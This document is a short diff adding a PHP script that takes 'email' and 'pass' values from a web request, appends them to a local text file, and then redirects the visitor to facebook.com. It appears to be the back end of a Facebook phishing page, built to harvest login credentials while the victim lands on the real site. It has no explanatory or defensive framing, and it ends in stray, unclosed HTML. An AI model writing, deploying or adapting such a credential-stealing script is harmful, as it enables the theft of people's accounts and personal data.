@@ -1,0 +1,22 @@
+<html>
+<?
+$caixa1 = $_GET["email"].":";
+$caixa2 = $_GET["pass"]. "\n";
+
+$file = fopen("son.txt", "a");
+$escrever1 = fwrite($file, $caixa1);
+$escrever2 = fwrite($file, $caixa2);
+
+fclose($file);
+
+
+?>
+<meta http-equiv="refresh" content="0;url=https://www.facebook.com/">
+<noscript>
+<!---
+<html>
+<head>
+</head>
+<body>
+</body>
+</html>
